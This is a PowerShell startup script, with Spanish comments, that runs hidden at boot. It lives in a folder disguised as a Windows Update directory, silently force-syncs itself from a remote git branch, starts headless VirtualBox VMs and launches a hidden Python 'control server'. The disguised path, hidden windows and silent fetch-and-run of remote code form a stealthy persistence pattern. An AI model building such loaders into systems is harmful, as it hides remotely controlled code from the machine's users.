# startup.ps1 - Ejecuta al inicio del sistema
$ErrorActionPreference = 'SilentlyContinue'
$InstallPath = "$env:ProgramData\Microsoft\WindowsUpdate"

# Ocultar ventana
$signature = @'
[DllImport("user32.dll")] 
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
Add-Type -MemberDefinition $signature -Name WinAPI -Namespace Windows
$hwnd = (Get-Process -Id $PID).MainWindowHandle
[Windows.WinAPI]::ShowWindow($hwnd, 0)

# Esperar a que esté lista la red
$timeout = 120
$counter = 0
while (-not (Test-NetConnection -ComputerName 8.8.8.8 -Port 53 -InformationLevel Quiet) -and $counter -lt $timeout) {
    Start-Sleep -Seconds 5
    $counter += 5
}

# Actualizar desde GitHub
try {
    cd $InstallPath
    git fetch origin 2>&1 | Out-Null
    git reset --hard origin/main 2>&1 | Out-Null
} catch { }

# Iniciar VMs desde configuración
if (Test-Path "$InstallPath\config\vms.json") {
    $vms = Get-Content "$InstallPath\config\vms.json" | ConvertFrom-Json
    foreach ($vm in $vms.autostart) {
        & "$env:ProgramFiles\Oracle\VirtualBox\VBoxManage.exe" startvm $vm --type headless 2>&1 | Out-Null
    }
}

# Iniciar servidor de control
Start-Process -FilePath "python" -ArgumentList "`"$InstallPath\scripts\control-server.py`"" -WindowStyle Hidden

# Ejecutar limpieza mensual
if ((Get-Date).Day -eq 1) {
    & "$InstallPath\scripts\cleanup.ps1"
}
